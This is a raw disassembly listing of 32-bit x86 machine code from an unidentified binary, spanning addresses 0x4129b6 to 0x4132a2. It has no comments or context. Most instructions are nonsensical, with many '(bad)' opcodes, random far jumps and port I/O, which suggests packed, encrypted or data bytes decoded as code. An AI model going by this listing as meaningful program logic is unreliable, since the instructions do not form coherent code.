  4129b6:	jl     0x41293f
  4129b8:	ja     0x41293b
  4129ba:	gs adc ebx,ebp
  4129bd:	in     al,dx
  4129be:	int3   
  4129bf:	cmp    eax,0xc4410522
  4129c4:	(bad)  
  4129c5:	jg     0x412a14
  4129c7:	jge    0x4129f0
  4129c9:	ins    DWORD PTR es:[edi],dx
  4129ca:	inc    ebp
  4129cb:	adc    edi,eax
  4129cd:	jg     0x412982
  4129cf:	mov    eax,DWORD PTR [eax+ecx*4-0x52]
  4129d3:	inc    esp
	...
  4129e0:	add    BYTE PTR [eax],al
  4129e2:	add    BYTE PTR [ebx+0x6d],ah
  4129e5:	jnp    0x41296d
  4129e7:	lods   eax,DWORD PTR ds:[esi]
  4129e8:	jg     0x412a59
  4129ea:	inc    ecx
  4129eb:	mov    edi,0x9c979b83
  4129f0:	push   cs
  4129f1:	ins    DWORD PTR es:[edi],dx
  4129f2:	pop    ebp
  4129f3:	xchg   esp,eax
  4129f4:	jg     0x4129de
  4129f6:	or     BYTE PTR [edi],0x6d
  4129f9:	call   0xe8e10af4
  4129fe:	add    esp,DWORD PTR [ebx-0x7c]
  412a01:	push   DWORD PTR [ebx-0x2c]
  412a04:	jg     0x412a13
  412a06:	gs bnd jg 0x412a08
  412a0a:	jmp    0xd22922ec
  412a0f:	push   ecx
  412a10:	es add cl,ch
  412a13:	fyl2xp1 
  412a15:	out    0x62,eax
  412a17:	out    0x8b,al
  412a19:	(bad)  
  412a1a:	cwde   
  412a1b:	out    0xd5,eax
  412a1d:	jmp    0x52f9:0x3bb05d0f
  412a24:	or     eax,0x95df03c
  412a29:	sub    al,0xd9
  412a2b:	leave  
  412a2c:	add    ch,BYTE PTR [eax+ebp*1]
  412a2f:	arpl   WORD PTR [ebx],cx
  412a31:	adc    BYTE PTR [ebp+0x6909f530],0xe4
  412a38:	cmp    eax,0x6ae0ec77
  412a3d:	das    
  412a3e:	xchg   edx,eax
  412a3f:	(bad)  
  412a40:	(bad)  
  412a41:	jmp    0x412a6b
  412a43:	fild   WORD PTR [edx+0x9]
  412a46:	test   eax,0x0
	...
  412a53:	add    BYTE PTR [eax],al
  412a55:	add    al,al
  412a57:	add    cl,BYTE PTR [edx]
  412a59:	sub    eax,0x300acd8a
  412a5e:	jae    0x412aaf
  412a60:	pop    eax
  412a61:	pusha  
  412a62:	fwait
  412a63:	popa   
  412a64:	(bad)  
  412a65:	aam    0xe8
  412a67:	pop    DWORD PTR [ecx+ecx*2+0x5]
  412a6b:	retf   0xe9d7
  412a6e:	pusha  
  412a6f:	add    eax,0x59236400
  412a74:	dec    edi
  412a75:	ret    
  412a76:	addr16 jmp 0x412a78
  412a79:	xchg   edx,eax
  412a7a:	pusha  
  412a7b:	jmp    0x412a7c
  412a7d:	xchg   edx,eax
  412a7e:	pusha  
  412a7f:	nop
  412a80:	inc    esp
  412a81:	xor    eax,0xe0147e50
  412a86:	scas   eax,DWORD PTR es:[edi]
  412a87:	(bad)  
  412a8a:	xchg   ecx,eax
  412a8b:	inc    edx
  412a8c:	jb     0x412ab0
  412a8e:	or     DWORD PTR ds:0x65f600d8,ecx
  412a94:	std    
  412a95:	jne    0x412aed
  412a97:	xchg   DWORD PTR [ebx-0x28],esi
  412a9a:	jge    0x412aaa
  412a9c:	in     al,0xff
  412a9e:	mov    bh,0x9d
  412aa0:	std    
  412aa1:	jne    0x412ae5
  412aa3:	call   0x75fd:0x881dfcbb
  412aaa:	add    ah,BYTE PTR [ecx+0x24a2096]
  412ab0:	push   DWORD PTR [ebp+0x1e]
  412ab3:	mov    eax,ds:0x87fd4f78
  412ab8:	std    
  412ab9:	jne    0x412abb
	...
  412ac7:	add    BYTE PTR [eax],al
  412ac9:	shl    BYTE PTR [eax-0x7802b090],cl
  412acf:	std    
  412ad0:	jne    0x412ab8
  412ad2:	mov    al,ds:0x87dd4f68
  412ad7:	mov    eax,DWORD PTR [ebp-0x76]
  412ada:	cmp    eax,ebp
  412adc:	nop
  412add:	push   edi
  412ade:	mov    ch,bh
  412ae0:	pop    edi
  412ae1:	dec    esp
  412ae2:	mov    edx,0x2efa0cc0
  412ae7:	mov    ebp,esp
  412ae9:	jns    0x412b30
  412aeb:	cli    
  412aec:	push   0xffffffca
  412aee:	sbb    eax,DWORD PTR [ebp-0x1]
  412af1:	mov    bh,0x79
  412af3:	out    0x81,al
  412af5:	out    dx,al
  412af6:	mov    ch,bh
  412af8:	mov    edi,esi
  412afa:	test   ebp,edi
  412afc:	jne    0x412ab0
  412afe:	cdq    
  412aff:	and    ch,bh
  412b01:	ins    DWORD PTR es:[edi],dx
  412b02:	mov    BYTE PTR [eax+0x5],ch
  412b05:	and    bh,bh
  412b07:	push   ecx
  412b08:	(bad)  
  412b09:	jge    0x412b87
  412b0b:	mov    esi,0x68319c74
  412b10:	mul    DWORD PTR [ebx+0x2f]
  412b13:	inc    esp
  412b14:	add    bl,bh
  412b16:	imul   eax,DWORD PTR [edx],0xffffffef
  412b19:	lds    edx,FWORD PTR [ebx+0x6c224625]
  412b1f:	xor    bh,bh
  412b21:	out    dx,al
  412b22:	arpl   WORD PTR [edx-0x7c910ec3],bx
  412b28:	out    0x4e,eax
  412b2a:	aaa    
  412b2b:	test   esi,edi
	...
  412b39:	add    BYTE PTR [eax],al
  412b3b:	add    BYTE PTR [edx+edx*8-0x79],bl
  412b3f:	dec    dh
  412b41:	call   0x834b:0x9f87
  412b47:	enter  0x6b21,0x2
  412b4b:	push   ebp
  412b4c:	call   0x3804aa9b
  412b51:	sbb    al,0x1a
  412b53:	add    BYTE PTR [ecx+0x5b748524],bh
  412b59:	xchg   esi,eax
  412b5a:	xlat   BYTE PTR ds:[ebx]
  412b5b:	dec    ebx
  412b5c:	sbb    al,0x9c
  412b5e:	jns    0x412ba4
  412b60:	pop    ss
  412b61:	call   0x2d7c6b2b
  412b66:	add    al,0x80
  412b68:	inc    esp
  412b69:	outs   dx,BYTE PTR ds:[esi]
  412b6a:	push   cs
  412b6b:	push   ecx
  412b6c:	mov    ebx,eax
  412b6e:	cmp    al,0x41
  412b70:	arpl   WORD PTR [ebx],bx
  412b72:	pushf  
  412b73:	jne    0x412bb7
  412b75:	outs   dx,BYTE PTR ds:[esi]
  412b76:	add    cl,BYTE PTR [ebx]
  412b78:	and    ebx,DWORD PTR [ebx+0x0]
  412b7b:	jmp    0x412be9
  412b7d:	push   esi
  412b7e:	pusha  
  412b7f:	inc    ebp
  412b80:	and    ch,BYTE PTR [esi+0x2b]
  412b83:	call   0x4538ce
  412b88:	pop    eax
  412b89:	cs mov db2,esp
  412b8d:	(bad)  
  412b8e:	jp     0x412be7
  412b90:	mov    ah,0x33
  412b92:	clc    
  412b93:	mov    edi,0x68325537
  412b98:	arpl   WORD PTR ds:0xedde94e9,ax
  412b9e:	push   edi
  412b9f:	cmp    eax,0x0
	...
  412bac:	add    BYTE PTR [eax],al
  412bae:	add    BYTE PTR [edx],ah
  412bb0:	add    eax,0xd1784b9
  412bb5:	add    DWORD PTR ds:0x9b057c10,ecx
  412bbb:	ret    0xfdcb
  412bbe:	cmp    DWORD PTR [eax+0x38],0x29
  412bc2:	dec    edx
  412bc3:	ins    DWORD PTR es:[edi],dx
  412bc4:	jl     0x412bb3
  412bc6:	xor    DWORD PTR [edx-0x55],0x20
  412bca:	or     edx,esi
  412bcc:	lods   al,BYTE PTR ds:[esi]
  412bcd:	(bad)  
  412bcf:	pop    eax
  412bd0:	jl     0x412c2d
  412bd2:	or     al,0x3b
  412bd4:	add    al,0x1d
  412bd6:	add    DWORD PTR [ebp-0x24],0xffffffaf
  412bda:	inc    esi
  412bdb:	pusha  
  412bdc:	add    eax,0x86488f14
  412be1:	lods   al,BYTE PTR ds:[esi]
  412be2:	push   esp
  412be3:	xor    eax,0x9f91ad7c
  412be8:	jns    0x412c22
  412bea:	adc    DWORD PTR [edi+0x68f99e15],0x6d
  412bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf2:	and    al,0x63
  412bf4:	add    eax,0x825543e2
  412bf9:	mov    ebx,0xa6056305
  412bfe:	leave  
  412bff:	in     al,dx
  412c00:	add    al,0xe9
  412c02:	add    esp,DWORD PTR [ebx+0x44]
  412c05:	and    esi,DWORD PTR [ebp+eiz*8+0x3]
  412c09:	jmp    0xd3467511
  412c0e:	add    ecx,DWORD PTR [ecx+0x5]
  412c11:	ret    
  412c12:	add    eax,DWORD PTR [eax]
	...
  412c20:	add    BYTE PTR [eax],al
  412c22:	faddp  st(1),st
  412c24:	pop    eax
  412c25:	aam    0xd7
  412c27:	cmp    DWORD PTR [eax],0x987bbd7b
  412c2d:	sub    BYTE PTR [edi],0x7d
  412c30:	push   DWORD PTR ds:0x4fe77faa
  412c36:	jg     0x412c3d
  412c38:	add    dl,dh
  412c3a:	and    al,bh
  412c3c:	add    al,0x10
  412c3e:	pop    ss
  412c3f:	add    eax,0x9378e900
  412c44:	daa    
  412c45:	test   al,0x60
  412c47:	jl     0x412cbd
  412c49:	(bad)  [eax]
  412c4b:	inc    ebp
  412c4c:	push   eax
  412c4d:	(bad)  
  412c4e:	loope  0x412c1b
  412c50:	mov    bl,BYTE PTR [ecx]
  412c52:	rol    BYTE PTR [eax+0x7ae1f6ef],cl
  412c58:	dec    edi
  412c59:	cmp    ecx,edi
  412c5b:	mov    ch,0x50
  412c5d:	fsubrp st(1),st
  412c5f:	lea    eax,[ebp+eax*8-0x3e018437]
  412c66:	pop    ecx
  412c67:	retf   
  412c68:	inc    dh
  412c6a:	rol    ecx,cl
  412c6c:	repz sbb DWORD PTR [edi+0xc],eax
  412c70:	inc    edi
  412c71:	sub    BYTE PTR [edi+0x7a],ah
  412c74:	mov    ah,0xbd
  412c76:	test   eax,0x1ba6fe7b
  412c7b:	psubsb mm6,mm1
  412c7e:	das    
  412c7f:	jl     0x412c7f
  412c81:	pusha  
  412c82:	fist   DWORD PTR [edx-0xa]
  412c85:	mov    es,WORD PTR [eax]
	...
  412c93:	add    BYTE PTR [eax],al
  412c95:	loope  0x412c83
  412c97:	call   DWORD PTR [eax]
  412c99:	pop    edi
  412c9a:	ret    0xe940
  412c9d:	loope  0x412c50
  412c9f:	jmp    0x412d1f
  412ca1:	loope  0x412d1e
  412ca3:	(bad)  
  412ca4:	hlt    
  412ca5:	push   esp
  412ca6:	ins    DWORD PTR es:[edi],dx
  412ca7:	in     al,dx
  412ca8:	mov    ecx,0x64887be1
  412cad:	dec    eax
  412cae:	jae    0x412cae
  412cb0:	push   esi
  412cb1:	mov    esi,0x980a667a
  412cb6:	(bad)  
  412cb9:	and    eax,0x75f7eabd
  412cbe:	xchg   ebp,edi
  412cc0:	jne    0x412c88
  412cc2:	out    dx,al
  412cc3:	rcl    BYTE PTR [eax+0x75],1
  412cc6:	xchg   DWORD PTR [edi-0x200917b],eax
  412ccc:	inc    DWORD PTR [edi]
  412cce:	(bad)  
  412ccf:	shl    bh,cl
  412cd1:	jne    0x412c5a
  412cd3:	dec    esi
  412cd4:	push   0x3f4fb1
  412cd9:	gs mov ebp,0x8475f7ea
  412cdf:	std    
  412ce0:	jne    0x412c68
  412ce2:	out    dx,al
  412ce3:	mov    al,0x50
  412ce5:	jne    0x412c6b
  412ce7:	or     eax,eax
  412ce9:	mov    esi,0xebd831e
  412cee:	cld    
  412cef:	std    
  412cf0:	(bad)  
  412cf1:	ds jae 0x412d02
  412cf4:	jmp    FWORD PTR [edx-0x6c]
  412cf7:	and    eax,0x0
	...
  412d06:	add    BYTE PTR [eax],al
  412d08:	std    
  412d09:	cmp    ebp,0x50
  412d0c:	adc    al,BYTE PTR [ecx*2+0x12e7f5ff]
  412d13:	or     edi,edx
  412d15:	jl     0x412d1b
  412d17:	push   eax
  412d18:	repnz outs dx,DWORD PTR ds:[esi]
  412d1a:	dec    ebx
  412d1b:	push   ebp
  412d1d:	retf   
  412d1e:	and    eax,0xffffffed
  412d21:	cmp    ebp,0x15
  412d24:	cli    
  412d25:	add    eax,0x6e0a6a00
  412d2a:	sub    BYTE PTR [edi+0x4b],al
  412d2d:	add    edi,edi
  412d2f:	mov    ch,0xe6
  412d31:	sti    
  412d32:	std    
  412d33:	push   DWORD PTR [ebp+0x72]
  412d36:	or     ch,al
  412d38:	mov    dh,0x55
  412d3a:	std    
  412d3b:	call   DWORD PTR [ebx-0x7e]
  412d3e:	(bad)  
  412d40:	arpl   bx,dx
  412d42:	sub    BYTE PTR [ecx+0x63],0x44
  412d46:	enter  0x2246,0x6c
  412d4a:	jg     0x412d00
  412d4c:	(bad)  
  412d4d:	xor    al,BYTE PTR [ecx+0xeb8acfe]
  412d53:	call   0xfec0c96a
  412d58:	jmp    0x851a:0x94f653e8
  412d5f:	mov    esp,0xfe811aab
  412d64:	arpl   WORD PTR [ebx-0x7a],bx
  412d67:	xchg   ebx,eax
  412d68:	arpl   WORD PTR [edx+eax*1+0x68],bp
	...
  412d78:	add    BYTE PTR [eax],al
  412d7a:	add    BYTE PTR [edx],dl
  412d7c:	mov    ds:0xa8dfffc1,eax
  412d81:	jbe    0x412dd2
  412d83:	xor    BYTE PTR fs:[esi+esi*8+0x5c],bl
  412d88:	pusha  
  412d89:	push   0x6b
  412d8b:	rcl    DWORD PTR [edi+0x7f],1
  412d8e:	or     ah,BYTE PTR [ebx]
  412d90:	(bad)  
  412d92:	add    dh,0x52
  412d95:	add    dh,BYTE PTR [ebp+esi*4-0x15]
  412d99:	mov    ebp,0x7fb82ce3
  412d9e:	push   DWORD PTR [eax+0x3bbc84c1]
  412da4:	mov    al,0x7f
  412da6:	(bad)  
  412da7:	arpl   WORD PTR [edx],bx
  412da9:	call   0x6fafa115
  412dae:	mov    ebp,0xe80c1a0c
  412db3:	xchg   ecx,eax
  412db4:	and    eax,0x39fcfe81
  412db9:	imul   esi,esi,0xfffffff4
  412dbc:	idiv   DWORD PTR [edi+0x74]
  412dbf:	pop    ebx
  412dc0:	xchg   BYTE PTR [eax+0x48],cl
  412dc3:	in     al,0xe7
  412dc5:	jg     0x412d7b
  412dc7:	mov    DWORD PTR ds:0x78d5805e,0xbdbb0bd3
  412dd1:	lahf   
  412dd2:	add    ch,0x78
  412dd5:	shl    DWORD PTR [edi-0x43],cl
  412dd8:	mov    dl,0x20
  412dda:	js     0x412d91
  412ddc:	js     0x412e1b
  412dde:	test   BYTE PTR [eax],0x0
	...
  412ded:	add    BYTE PTR [ebp+ebp*2-0x4f],ah
  412df1:	retf   0x78a5
  412df4:	sub    eax,0x2570bcb6
  412df9:	adc    BYTE PTR [ebp+0x556bf0f2],0xce
  412e00:	adc    eax,0x2cb28580
  412e05:	js     0x412e84
  412e07:	js     0x412e0e
  412e09:	neg    BYTE PTR [ebp+ebp*2+0x71]
  412e0d:	retf   0x786d
  412e10:	cmc    
  412e11:	mov    ch,0x94
  412e13:	jo     0x412e02
  412e15:	jg     0x412e74
  412e17:	repnz lock imul edx,edi,0xffffffce
  412e1c:	fnstsw WORD PTR [edi+0x4d]
  412e1f:	mov    dl,0xb0
  412e21:	ja     0x412e68
  412e23:	js     0x412de5
  412e25:	xchg   DWORD PTR [eax-0x10803a88],ebp
  412e2b:	ins    BYTE PTR es:[edi],dx
  412e2c:	mov    ch,0x7f
  412e2e:	sub    eax,0x25d0346d
  412e33:	js     0x412de2
  412e35:	mov    ecx,0x7fa57038
  412e3a:	cld    
  412e3b:	cmc    
  412e3c:	sub    al,0x7f
  412e3e:	or     eax,0xd685b78
  412e43:	js     0x412dd2
  412e45:	ins    BYTE PTR es:[edi],dx
  412e46:	xchg   cl,cl
  412e48:	test   DWORD PTR [edi-0xb],edi
  412e4b:	mov    cl,0x98
  412e4d:	ja     0x412e3c
  412e4f:	ja     0x412e50
  412e51:	add    BYTE PTR [eax],0x0
	...
  412e60:	add    BYTE PTR [eax],cl
  412e62:	int3   
  412e63:	(bad)  
  412e64:	outs   dx,BYTE PTR ds:[esi]
  412e65:	pop    esp
  412e66:	mov    cl,0xeb
  412e68:	pop    esi
  412e69:	push   esp
  412e6a:	ja     0x412e6a
  412e6c:	aam    0x5c
  412e6e:	js     0x412ee4
  412e70:	loope  0x412eaa
  412e72:	inc    edx
  412e73:	cld    
  412e74:	dec    esi
  412e75:	cmp    al,0x77
  412e77:	mov    ah,0x55
  412e79:	sub    al,0x77
  412e7b:	(bad)  
  412e7c:	push   ecx
  412e7d:	ins    BYTE PTR es:[edi],dx
  412e7e:	leave  
  412e7f:	(bad)  
  412e80:	ss and al,0xc1
  412e83:	test   DWORD PTR [eax+0x39],0x1426fe79
  412e8a:	icebp  
  412e8b:	sti    
  412e8c:	adc    esi,ebx
  412e8e:	sbb    DWORD PTR [eax],eax
  412e90:	jmp    0xe94c74ac
  412e95:	fwait
  412e96:	mov    ch,bl
  412e98:	push   0x2b
  412e9a:	mov    WORD PTR fs:[esp+ebp*8-0x610c9839],fs
  412ea2:	(bad)  
  412ea3:	inc    DWORD PTR [eax-0x16bf3ee7]
  412ea9:	aad    0xf1
  412eab:	or     edx,ecx
  412ead:	test   esi,eax
  412eaf:	(bad)  
  412eb0:	(bad)  
  412eb1:	pop    ecx
  412eb2:	inc    ebp
  412eb3:	jae    0x412ef7
  412eb5:	pop    ss
  412eb6:	test   BYTE PTR [ebp+eax*8+0x5c],bh
  412eba:	lock pop esi
  412ebc:	mov    esi,0xb1448670
  412ec1:	(bad)  
  412ec3:	div    DWORD PTR [ebp+0x0]
	...
  412ed1:	add    BYTE PTR [eax],al
  412ed3:	add    BYTE PTR [edi+0x5],ah
  412ed6:	add    BYTE PTR [edi],bl
  412ed8:	pop    esp
  412ed9:	ds inc esp
  412edb:	mov    eax,ds:0xe9000594
  412ee0:	jns    0x412ea6
  412ee2:	(bad)  
  412ee3:	adc    al,0x7f
  412ee5:	fiadd  WORD PTR [ebx]
  412ee7:	add    BYTE PTR [ebp+0x40],al
  412eea:	dec    BYTE PTR [edi+eax*2+0x16e84eed]
  412ef1:	sbb    DWORD PTR [eax],eax
  412ef3:	add    BYTE PTR [ecx-0x42],cl
  412ef6:	or     ch,BYTE PTR [edx-0x36]
  412ef9:	xchg   ebp,eax
  412efa:	inc    ebx
  412efb:	in     al,0xa
  412efd:	imul   edi,DWORD PTR [ecx-0xfd04ba],0x75
  412f04:	sahf   
  412f05:	jmp    0xc009:0xf71d4edc
  412f0c:	test   BYTE PTR [esi],0x50
  412f0f:	push   0xbeef02bb
  412f14:	cli    
  412f15:	div    DWORD PTR [ebx+0x8]
  412f18:	jb     0x412ebf
  412f1a:	imul   edi,edi,0x6d
  412f1d:	jmp    0x4dfd:0xf76d4bac
  412f24:	push   edx
  412f25:	cmp    DWORD PTR [ebx-0x8],0xffffff8a
  412f29:	jge    0x412ee1
  412f2b:	call   0x3e7a4a
  412f30:	inc    ebx
  412f31:	les    eax,FWORD PTR [esi]
  412f33:	add    bh,dh
  412f35:	mov    ch,dl
  412f37:	add    DWORD PTR [eax],0x0
	...
  412f46:	add    BYTE PTR [esi],al
  412f48:	test   DWORD PTR [eax+0x0],ebp
  412f4b:	mov    al,0x40
  412f4d:	std    
  412f4e:	jne    0x412f92
  412f50:	jmp    0x4587:0xf82d48c0
  412f57:	push   ds
  412f58:	imul   edx,edi,0xff017b46
  412f5e:	xor    eax,0x412a55
  412f63:	int    0x6d
  412f65:	push   es
  412f66:	call   0x3eb465
  412f6b:	jb     0x412f47
  412f6d:	inc    esp
  412f6e:	inc    ecx
  412f6f:	arpl   WORD PTR [edx+ebp*8+0x1],bp
  412f73:	arpl   WORD PTR [edx+eax*4-0x2],bp
  412f77:	outs   dx,BYTE PTR ds:[esi]
  412f78:	je     0x412fe4
  412f7a:	fucomp st(7)
  412f7c:	idiv   BYTE PTR [esi+edi*8+0x2e]
  412f80:	inc    edi
  412f81:	sub    DWORD PTR [ecx+0x63],eax
  412f84:	out    0xf6,eax
  412f86:	pop    es
  412f87:	retf   
  412f88:	adc    al,0x7d
  412f8a:	dec    ah
  412f8c:	push   ebx
  412f8d:	add    BYTE PTR [eax],al
  412f8f:	arpl   sp,bp
  412f91:	jl     0x413007
  412f93:	imul   eax,esp,0x1f
  412f96:	push   DWORD PTR [esi+edi*4+0x36af747c]
  412f9d:	test   DWORD PTR [edi],0xfecbf1bb
  412fa3:	pushf  
  412fa4:	and    al,0x42
  412fa6:	add    esp,DWORD PTR [ebx-0x47]
  412fa9:	xchg   ebx,ebp
	...
  412fb7:	add    BYTE PTR [eax],al
  412fb9:	add    al,ah
  412fbb:	pop    ds
  412fbc:	pusha  
  412fbd:	push   ebp
  412fbe:	sub    al,0x82
  412fc0:	add    ch,BYTE PTR [edx+0x2b]
  412fc3:	pop    es
  412fc4:	test   DWORD PTR [edi],0xfeca9f8b
  412fca:	ins    BYTE PTR es:[edi],dx
  412fcb:	hlt    
  412fcc:	(bad)  
  412fcd:	sti    
  412fce:	loopne 0x412f80
  412fd0:	dec    ebp
  412fd1:	sub    eax,0xf025ea2
  412fd6:	fistp  QWORD PTR [ecx-0x209cffff]
  412fdc:	cmp    eax,0x41d75d1
  412fe1:	add    BYTE PTR [edx+ebp*8+0x42],ch
  412fe5:	add    BYTE PTR [ebx+0x5e],ah
  412fe8:	jg     0x413026
  412fea:	or     al,BYTE PTR ds:0x6c24ffc3
  412ff0:	xchg   BYTE PTR [edx-0x7cfda19e],dh
  412ff6:	push   esi
  412ff7:	add    eax,0x5a22d84
  412ffc:	jmp    0xe7ed0f0d
  413001:	add    esp,DWORD PTR [ebx-0x78]
  413004:	retf   
  413005:	mov    ds:0x3e8c646,al
  41300a:	pop    esp
  41300b:	mov    DWORD PTR [edi+0x2],ebx
  41300e:	arpl   WORD PTR ds:0x24063e6a,ax
  413014:	sub    BYTE PTR [ebx+eiz*2],al
  413017:	add    al,0x6d
  413019:	(bad)  
  41301a:	arpl   WORD PTR ds:0x80e9,ax
	...
  41302c:	add    BYTE PTR [edi-0x433cf962],al
  413032:	je     0x413011
  413034:	xchg   DWORD PTR ds:0xe003e906,esi
  41303a:	xor    dl,BYTE PTR [ebp*1+0xce90522]
  413041:	out    0xf7,eax
  413043:	out    0x3,eax
  413045:	arpl   bp,bx
  413047:	pop    esp
  413049:	and    eax,DWORD PTR ds:0x1a840393
  41304f:	and    al,0x2d
  413051:	and    al,BYTE PTR ds:0x886cc660
  413057:	cmp    DWORD PTR [ebx+0x6c],0x3
  41305b:	(bad)  gs:[ebx+0x5]
  41305f:	jmp    0xee1c858c
  413064:	cmc    
  413065:	dec    esp
  413066:	je     0x413063
  413068:	push   esp
  413069:	jle    0x413031
  41306b:	call   0xdf4164fe
  413070:	icebp  
  413071:	addr16 pop esi
  413073:	push   ss
  413074:	add    eax,0xd2720563
  413079:	pop    eax
  41307a:	xor    BYTE PTR [edx],0xec
  41307d:	fldz   
  41307f:	inc    DWORD PTR [esi+ebp*8-0x40]
  413083:	repz loop 0x41301f
  413086:	add    eax,DWORD PTR [esp+eax*1-0x6ffffa9a]
  41308d:	pop    ecx
  41308e:	push   es
  41308f:	add    cl,ch
	...
  41309d:	add    BYTE PTR [eax],al
  41309f:	add    BYTE PTR [eax],cl
  4130a1:	loopne 0x4130e9
  4130a3:	sub    BYTE PTR [edi+0x74],bl
  4130a6:	ss xchg ecx,eax
  4130a8:	inc    esi
  4130a9:	adc    DWORD PTR [eax],eax
  4130ab:	jmp    0x6c4f7605
  4130b0:	push   ebx
  4130b1:	je     0x4130b1
  4130b3:	jmp    0xe9492395
  4130b8:	pop    ecx
  4130b9:	mov    ecx,ebp
  4130bb:	jmp    0xdf403620
  4130c0:	push   0x39a35f5d
  4130c5:	jae    0x41304f
  4130c7:	lods   al,BYTE PTR ds:[esi]
  4130c8:	xor    BYTE PTR [ebx+0x76],dh
  4130cb:	icebp  
  4130cc:	sub    ecx,edi
  4130ce:	out    dx,eax
  4130cf:	ss nop
  4130d1:	jmp    edi
  4130d3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4130d5:	jb     0x4130d5
  4130d7:	xchg   ecx,eax
  4130d8:	xchg   edx,eax
  4130d9:	retf   0xe940
  4130dc:	or     ecx,edi
  4130de:	out    dx,eax
  4130df:	add    DWORD PTR [esi],ecx
  4130e1:	verw   cx
  4130e4:	gs inc ebp
  4130e6:	push   cs
  4130e7:	ins    BYTE PTR es:[edi],dx
  4130e8:	mov    bl,0x73
  4130ea:	(bad)  
  4130eb:	jmp    0xaccca466
  4130f0:	enter  0x8cc2,0xa4
  4130f4:	mov    esp,0x3ee969c2
  4130f9:	jae    0x41314f
  4130fb:	fidiv  WORD PTR [ebx+0x4c]
  4130fe:	sub    eax,0xbffe6728
  413103:	fiadd  WORD PTR [eax]
	...
  413111:	add    BYTE PTR [eax],al
  413113:	mov    ah,0x9b
  413115:	(bad)  
  413116:	(bad)  
  413117:	cmp    al,BYTE PTR [edi]
  413119:	lea    eax,[ebp+0x1e]
  41311c:	push   edi
  41311d:	std    
  41311e:	jne    0x413142
  413120:	lock jae 0x41310f
  413123:	lds    edx,FWORD PTR ds:0x93b2e9d
  413129:	or     eax,eax
  41312b:	outs   dx,BYTE PTR ds:[esi]
  41312c:	jno    0x4130b9
  41312e:	inc    ebp
  41312f:	jmp    0x6a09:0x60006856
  413136:	pop    es
  413137:	push   eax
  413138:	or     edi,edi
  41313a:	jne    0x41311a
  41313c:	out    dx,eax
  41313d:	adc    esp,DWORD PTR [ecx+0xafe49a4]
  413143:	or     ah,BYTE PTR [ebx+0x54]
  413146:	jmp    FWORD PTR [edi+0x13e8e6e6]
  41314c:	lock std 
  41314e:	mov    DWORD PTR [edi],ecx
  413150:	fisttp DWORD PTR [ebx-0x2a9d5bb]
  413156:	jne    0x4130de
  413158:	pusha  
  413159:	(bad)  
  41315a:	imul   edi,DWORD PTR [ebp-0x200101a0],0xeb15fdd2
  413164:	sbb    al,0x41
  413166:	add    BYTE PTR [ecx-0xdd68d3a],dl
  41316c:	push   es
  41316d:	add    bh,ch
  41316f:	adc    al,0xef
  413171:	jae    0x41317b
  413173:	bound  esi,QWORD PTR [esi]
  413175:	inc    esi
  413176:	inc    DWORD PTR [eax]
	...
  413184:	add    BYTE PTR [eax],al
  413186:	gs out dx,eax
  413188:	je     0x413192
  41318a:	gs jne 0x41318f
  41318d:	(bad)  
  41318e:	(bad)  
  413190:	out    0x58,eax
  413192:	cld    
  413193:	out    dx,al
  413194:	std    
  413195:	jmp    FWORD PTR [edi+0x675fde9]
  41319b:	in     al,dx
  41319c:	jae    0x4131a6
  41319e:	arpl   WORD PTR [ebp+ecx*8+0x45],ax
  4131a2:	xor    al,0x43
  4131a4:	js     0x41321a
  4131a6:	andps  xmm0,XMMWORD PTR [eax+ecx*2+0x7478b324]
  4131ae:	pop    es
  4131af:	mov    ebx,0x1d45a50e
  4131b4:	add    al,0x6a
  4131b6:	arpl   WORD PTR [ebx+0x7904ebee],bp
  4131bc:	test   eax,0x775ca22d
  4131c1:	je     0x4131b6
  4131c3:	and    eax,0x48
  4131c6:	in     al,dx
  4131c7:	mov    al,BYTE PTR [esi+eax*8-0xc390cad]
  4131ce:	loopne 0x413248
  4131d0:	outs   dx,BYTE PTR ds:[esi]
  4131d1:	jmp    DWORD PTR [ebp-0x17]
  4131d4:	imul   edi,ebp,0xffffffcc
  4131d7:	jmp    0x6978:0xd2c5b46a
  4131de:	arpl   bx,bx
  4131e0:	out    dx,al
  4131e1:	div    DWORD PTR [eax+edi*2+0x5c222d4d]
  4131e8:	ja     0x41325e
	...
  4131f6:	add    BYTE PTR [eax],al
  4131f8:	add    BYTE PTR [edi-0x74f810ce],ah
  4131fe:	cmc    
  4131ff:	sar    esi,0x94
  413202:	sbb    al,0xc8
  413205:	mov    eax,ds:0xd855025f
  41320a:	inc    DWORD PTR [edx+0x79129fc3]
  413210:	(bad)  
  413211:	out    0xa8,al
  413213:	jbe    0x413264
  413215:	ins    BYTE PTR es:[edi],dx
  413216:	lock push es
  413218:	jmp    FWORD PTR [esi]
  41321a:	dec    ebx
  41321b:	sub    DWORD PTR [ecx+0x63],eax
  41321e:	push   es
  41321f:	std    
  413220:	sbb    ah,BYTE PTR [ebx+0x5e]
  413223:	or     eax,eax
  413225:	pop    esp
  413226:	add    eax,0x563a86c
  41322b:	jmp    0xe8aed970
  413230:	add    esp,DWORD PTR [ebx+0x5]
  413233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413234:	mov    esi,0x3ed7130
  413239:	arpl   bx,bx
  41323b:	call   0xe9204f2d
  413240:	in     eax,dx
  413241:	adc    al,0x82
  413243:	and    esi,DWORD PTR [eax-0x64]
  413246:	sub    BYTE PTR [ebx+0x6f],0xd
  41324a:	jno    0x4131e9
  41324c:	sar    ebp,cl
  41324e:	cli    
  41324f:	nop
  413250:	js     0x4132c1
  413252:	jno    0x4131d4
  413254:	(bad)  
  413255:	dec    ecx
  413256:	add    eax,0xfa230ce9
  41325b:	jecxz  0x4132c7
	...
  413269:	add    BYTE PTR [eax],al
  41326b:	add    BYTE PTR [edx+0x6],dl
  41326e:	jmp    0xc0ce7d76
  413273:	ret    0x6fcc
  413276:	fild   DWORD PTR [edi]
  413278:	mov    ebx,0xbd78acf5
  41327d:	aad    0x61
  41327f:	push   ebx
  413280:	out    0x8a,eax
  413282:	push   esp
  413283:	jo     0x413232
  413285:	jo     0x41321f
  413287:	aad    0xbc
  413289:	in     eax,0xac
  41328b:	js     0x41322a
  41328d:	jle    0x4132fa
  41328f:	push   edi
  413290:	lea    esi,[eax+0x2d]
  413293:	imul   edx,esi,0xffffffbd
  413296:	and    eax,0x9104fa78
  41329b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41329c:	and    eax,0xaf78e8c6
  4132a1:	push   ecx
  4132a2:	adc    eax,0xbb706d78
